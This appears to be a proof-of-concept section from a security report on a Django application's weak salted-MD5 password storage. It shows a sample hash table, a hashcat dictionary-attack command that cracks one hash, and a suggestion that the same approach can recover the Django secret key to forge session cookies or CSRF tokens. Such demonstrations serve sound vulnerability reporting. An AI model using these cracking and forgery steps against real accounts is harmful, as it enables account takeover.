# 1. **Proof of concept**

## 1.1  Password storage

If the attacker is able to get the data on the database he should get someting like this:

| id | password                                                          | last_login | is_superuser |  username | ... |
|----|-------------------------------------------------------------------|------------|--------------|-----------|-----|
| 1  | md5\$VeVgy2ZPpwNSOejO0NUGDX$ed1c717cec771fb32d7de5a0ccd3fb2b      | some_date  |              | userTest1 |     |
| 2  | md5\$L4oOGpjpfvEvdXOJKp00QI$2b0226eae193bfb04b49f6ffe6635b1c      | some_date  |              | admin     |     |
|... |                                                                   |            |              |           |     |

Now it's a simple case of cracking the password, we will use hashcat for this example performing a dictionary attack using the rockyou.txt wordlist:

```shell script
hashcat -m 20 'ed1c717cec771fb32d7de5a0ccd3fb2b:VeVgy2ZPpwNSOejO0NUGDX' Documents/rockyou.txt
```

The result is :

``` shell
ed1c717cec771fb32d7de5a0ccd3fb2b:VeVgy2ZPpwNSOejO0NUGDX:Password11
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: ed1c717cec771fb32d7de5a0ccd3fb2b:VeVgy2ZPpwNSOejO0NUGDX
```

This can be extrapolated to other hashes and instead of using a dictonary attack use a brute/mask force attack.

## 1.2 Secret Key

The same process can be applied to discover the secret key of the Django framework, once we have a knowed signed value we can try to discover the secret key and finally create malicious session cookies for example or CSRF tokens to bypass protection
